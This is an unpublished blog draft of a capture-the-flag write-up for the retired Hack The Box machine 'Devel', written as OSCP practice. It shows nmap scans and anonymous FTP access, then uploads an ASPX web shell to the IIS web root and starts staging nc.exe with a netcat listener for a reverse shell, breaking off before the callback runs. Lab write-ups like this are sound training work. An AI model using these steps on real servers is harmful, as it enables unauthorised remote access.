---
published: false
---
## #1. OSCP Prep - HTB Series :: Devel Writeup (without metasploit)

Hi, this is my write up for the easy box **Devel** on Hackthebox. This is a retired windows machine and can be easily exploited in a matter of minutes is Metasploit. However, as this is for OSCP preparation, no metasploit will be used.

![devel_graphi]({{site.baseurl}}/_posts/devel_graphic.PNG)

If you enjoyed this write up feel free to follow me on twitter. Let's get started!! :)

___

### 1. Enumeration

#### nmap

Quick nmap scan on all ports to find the services that the machine has open:

	nmap -p- $IP -oN nmap.txt
    
    PORT   STATE SERVICE
	21 tcp open  ftp
	80 tcp open  http

We can see that the box is listening on **FTP (21)** and **HTTP (80)**.

Next aggressive scan to perform some service enumeration and default scripts against returned listening ports:

	nmap -p 21,80 -A $IP
	
    PORT   STATE SERVICE VERSION
    21 tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | 03-18-17  01:06AM       DIR          aspnet_client
    | 03-17-17  04:37PM                  689 iisstart.htm
    |_03-17-17  04:37PM               184946 welcome.png
    | ftp-syst: 
    |_  SYST: Windows_NT
    80 tcp open  http    Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS 7.5
    |_http-title: IIS7
	

Few items to note here:

**1.HTTP:**
- Running **IIS version 7.5**, this has been information has been pulled from server headers
- Allows the use of the **HTTP TRACE** verb; not useful to us in this scenario but worth noting if this was a pen test
- **HTTP-TITLE is IIS7** (potentially a **default test page**)

**1.FTP**
- **Anonymous login acess allowed**
- A listing of the directory when accessed anonymously

I like to normally go for HTTP first so let's do that


### 3. Further enumeration - HTTP

Accessing the web page we notice that this is indeed a default test page when configuring IIS:

![default_test_page]({{site.baseurl}}/_posts/2021-02-02 15_57_40-Window.png)

If we look at the sourcecode we can see the welcome.png file is hosted locally on the server:

![2021-02-02 16_03_57-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_03_57-Window.png)


### 4. Further enumeration - FTP

As shown earlier FTP allows anonymous access: that is where **username=anonymous** and **password=anything**. The following demonstrates how to do this:

	ftp $IP
    
    Connected to 10.129.90.59.
	220 Microsoft FTP Service
    Name (10.129.90.59:muzz): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password:
    230 User logged in.
    Remote system type is Windows_NT.
    ftp>

From this terminal we can run commands like **ls** to get a directory listing etc. The **help** command shows what's available. Doing a directory listing shows the files that te nmap scan previously picked up:

	ftp> ls
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    03-18-17  01:06AM       <DIR>          aspnet_client
    03-17-17  04:37PM                  689 iisstart.htm
    03-17-17  04:37PM               184946 welcome.png
    226 Transfer complete.
    ftp>

The file welcome.png and isstart.htm are of particular interest. Welcome.png is what was observed in the browser, indicating the FTP directory is very likely hosted in C:/inetpub/wwwroot.

To test this we create a file called test.txt and upload this to the server via FTP PUT:

	touch test.txt
    
    ftp> put test.txt
    local: test.txt remote: test.txt
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    226 Transfer complete.
    ftp>
    
    ftp> ls
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    03-18-17  01:06AM       <DIR>          aspnet_client
    03-17-17  04:37PM                  689 iisstart.htm
    02-02-21  06:17PM                    0 test.txt
    03-17-17  04:37PM               184946 welcome.png
    226 Transfer complete.
    ftp>


The file has been successfully uploaded. Let's try and access this via the browser:

![2021-02-02 16_19_18-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_19_18-Window.png)

So we now know we can access any resource we upload via FTP from the browser. This means if we were to set upload a reverse shell via FTP access it via FTP, we can setup a call back and get a shell. Let's try this.

### 5. Getting our 1st shell (Foothold)

As we can't use FTP we will have to be creative. As this is IIS, it is likely running **.ASP** or **.ASPX** as it's web framework, **NOT PHP**. I will go for .ASPX.

Kali linux has inbuilt web shells for .ASPX which can be located at /usr/share/webshells/aspx/. Copy the cmdasp.apsx web shell from here to our local dir:

	ls /usr/share/webshells/aspx/
	cmdasp.aspx
    
    cp /usr/share/webshells/aspx/cmdasp.aspx .

No changes to be made to file. Upload this file via FTP and then access the resource through the browser:

![2021-02-02 16_31_45-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_31_45-Window.png)


This is will allow us to run **windows commands** via a HTML page as can be seen above when running **whoami**.

So how do we get a shell from here?

We can upload netcat (nc.exe), set up our listener and get a callback. This can be done as follows:

	1. copy nc.exe to local dir:
		- cp /usr/share/windows-resources/binaries/nc.exe: .
    
    2. upload nc.exe to server via FTP
    	- ftp> put nc.exe
        
   	3. setup our local machine listener for the call back:
    	- nc -nlvp 4444
    
    4. go to $IP/cmdasp.aspx in the browser and find where is located
    	- dir "\nc.exe" /s

Enter text in [Markdown](http://daringfireball.net/projects/markdown/). Use the toolbar above, or click the **?** button for formatting help.
